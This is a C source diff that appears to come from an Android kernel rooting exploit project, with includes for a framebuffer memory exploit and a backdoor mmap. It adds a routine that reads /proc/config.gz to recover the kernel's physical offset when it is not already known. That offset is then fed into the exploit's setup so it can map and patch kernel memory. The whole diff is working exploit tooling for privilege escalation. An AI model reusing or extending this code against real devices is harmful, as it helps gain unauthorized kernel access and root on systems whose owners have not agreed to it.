@@ -5,6 +5,7 @@
 #include <strings.h>
 #include <fcntl.h>
 #define _LARGEFILE64_SOURCE
+#include <zlib.h>
 
 #include "device_database/device_database.h"
 #include "ptmx.h"
@@ -17,6 +18,9 @@
 #include "libfb_mem_exploit/fb_mem.h"
 #include "backdoor_mmap.h"
 #include "build_remap_pfn_range.h"
+
+#define CONFIG_SEARCH_STRING   "CONFIG_PHYS_OFFSET="
+#define CONFIG_SEARCH_LENGTH   (sizeof(CONFIG_SEARCH_STRING) - 1)
 
 #define PAGE_SHIFT        12
 
@@ -33,6 +37,53 @@ static int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
 
 static unsigned long int remap_pfn_range_end_op;
 static unsigned long int security_remap_pfn_range_address;
+
+static unsigned long int
+find_kernel_text_from_config(void)
+{
+  unsigned long int kernel_ram = 0;
+  gzFile f;
+
+  f = gzopen("/proc/config.gz", "rb");
+  if (!f) {
+    return 0;
+  }
+
+  while (!gzeof(f)) {
+    char buffer[1024];
+    int len;
+
+    if (gzgets(f, buffer, sizeof (buffer) - 1) == Z_NULL) {
+      break;
+    }
+
+    buffer[sizeof(buffer) - 1] = '\0';
+
+    if (strncmp(buffer, CONFIG_SEARCH_STRING, CONFIG_SEARCH_LENGTH) == 0) {
+      char *p;
+
+      strtok(buffer + CONFIG_SEARCH_LENGTH, "\r\n");
+
+      kernel_ram = strtoul(buffer + CONFIG_SEARCH_LENGTH, &p, 0);
+      if (!*p) {
+	kernel_ram += 0x00008000;
+
+	printf("Detected kernel physical address at 0x%08x form config\n", kernel_ram);
+
+	gzclose(f);
+
+	return kernel_ram;
+      }
+
+      kernel_ram = 0;
+      break;
+    }
+  }
+
+  gzclose(f);
+
+  return kernel_ram;
+}
 
 /*
 
@@ -117,6 +168,10 @@ setup_variables(void)
              kernel_phys_offset);
     }
 #endif
+
+    if (!kernel_phys_offset) {
+      kernel_phys_offset = find_kernel_text_from_config();
+    }
 
 #ifdef HAS_SET_SYMBOL_ADDRESS
     device_set_symbol_address(DEVICE_SYMBOL(kernel_physical_offset), kernel_phys_offset);
